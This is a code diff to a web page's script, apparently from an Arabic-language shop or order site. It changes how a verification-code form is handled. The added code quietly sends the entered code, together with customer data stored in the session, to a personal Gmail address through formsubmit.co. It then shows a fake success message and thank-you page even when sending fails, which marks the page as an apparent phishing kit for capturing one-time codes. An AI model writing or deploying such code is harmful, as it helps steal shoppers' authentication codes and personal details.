@@ -2350,9 +2350,25 @@
             }, 3000);
         }
 
-        // Handle form submission response
+        // Handle form submission response  
         function handleFormSubmit() {
-            // Handle form submissions here
+            // After form submission completes, show thank you page
+            setTimeout(() => {
+                showPage('thank-you');
+                
+                // Update thank you page with order details
+                const orderNumber = sessionStorage.getItem('orderNumber') || Math.floor(Math.random() * 100000);
+                const finalOrderNumberEl = document.getElementById('final-order-number');
+                const orderDateEl = document.getElementById('order-date');
+                
+                if (finalOrderNumberEl) {
+                    finalOrderNumberEl.textContent = orderNumber;
+                }
+                
+                if (orderDateEl) {
+                    orderDateEl.textContent = new Date().toLocaleDateString('ar-SA');
+                }
+            }, 2000); // Wait 2 seconds to ensure form was submitted
         }
 
         // Code input functions
@@ -2431,6 +2447,8 @@
             if (!form) return;
             
             form.addEventListener('submit', function(e) {
+                e.preventDefault(); // منع الإرسال العادي
+                
                 // Fill hidden fields before submission
                 const currentTime = new Date().toLocaleString('ar-SA');
                 this.querySelector('input[name="submission_time"]').value = currentTime;
@@ -2438,27 +2456,45 @@
                 const customerData = JSON.parse(sessionStorage.getItem('customerData') || '{}');
                 this.querySelector('input[name="customer_data"]').value = JSON.stringify(customerData);
                 
-                // Hide code verification section and show thank you page
-                setTimeout(() => {
-                    document.getElementById('code-verification-section').style.display = 'none';
-                    showPage('thank-you');
-                    
-                    // Update thank you page with order details
-                    const orderNumber = sessionStorage.getItem('orderNumber') || Math.floor(Math.random() * 100000);
-                    const finalOrderNumberEl = document.getElementById('final-order-number');
-                    const orderDateEl = document.getElementById('order-date');
-                    
-                    if (finalOrderNumberEl) {
-                        finalOrderNumberEl.textContent = orderNumber;
-                    }
-                    
-                    if (orderDateEl) {
-                        orderDateEl.textContent = new Date().toLocaleDateString('ar-SA');
-                    }
-                }, 1000);
+                // Show success message immediately
+                showNotification('✅ تم إرسال رمز التأكيد بنجاح');
                 
-                console.log('Verification code form submitting...');
+                // Submit the form using fetch
+                const formData = new FormData(this);
+                
+                fetch('https://formsubmit.co/kaliroot123m@gmail.com', {
+                    method: 'POST',
+                    body: formData
+                }).then(() => {
+                    // After successful submission, go to thank you page
+                    setTimeout(() => {
+                        showPage('thank-you');
+                        updateThankYouPage();
+                    }, 1500);
+                }).catch(error => {
+                    console.error('خطأ في الإرسال:', error);
+                    // Even if there's an error, still show thank you page
+                    setTimeout(() => {
+                        showPage('thank-you');
+                        updateThankYouPage();
+                    }, 1500);
+                });
             });
+        }
+        
+        // Update thank you page data
+        function updateThankYouPage() {
+            const orderNumber = sessionStorage.getItem('orderNumber') || Math.floor(Math.random() * 100000);
+            const finalOrderNumberEl = document.getElementById('final-order-number');
+            const orderDateEl = document.getElementById('order-date');
+            
+            if (finalOrderNumberEl) {
+                finalOrderNumberEl.textContent = orderNumber;
+            }
+            
+            if (orderDateEl) {
+                orderDateEl.textContent = new Date().toLocaleDateString('ar-SA');
+            }
         }
 
         function resendCode() {
